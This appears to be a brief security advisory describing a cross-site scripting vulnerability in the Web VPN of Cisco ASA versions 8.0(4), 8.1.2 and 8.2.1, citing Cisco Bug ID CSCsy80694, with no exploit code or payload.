Cisco ASA (Adaptive Security Appliance) is prone to a cross-site scripting vulnerability because its Web VPN fails to properly sanitize user-supplied input.

An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site and to steal cookie-based authentication credentials.

This issue is documented by Cisco Bug ID CSCsy80694.

Cisco ASA 8.0.(4), 8.1.2, and 8.2.1 are vulnerable.
